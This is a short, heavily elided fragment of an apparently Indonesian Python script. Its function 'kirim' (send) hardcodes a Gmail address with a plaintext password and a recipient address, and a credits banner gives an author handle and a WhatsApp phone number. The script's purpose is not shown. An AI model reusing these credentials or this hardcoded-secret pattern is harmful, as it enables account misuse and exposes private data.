...
def inputM(x,d):
	...
	return i
def kirim():
   email_user = 'kegoblokan.hqq@gmail.com'
   email_password = 'memek12345'
   email_send = 'kegoblokan.hqq@bk.ru'
...
# \rhBY\rp                                             TENZEN   \rk#
# \rhWhatsaap\rp                                   089685016675 \rk#
# \rhGitHub\rp                                                --\rk#
# \rhTolls Hasil\rp                              Recode sTorymBem \rk#
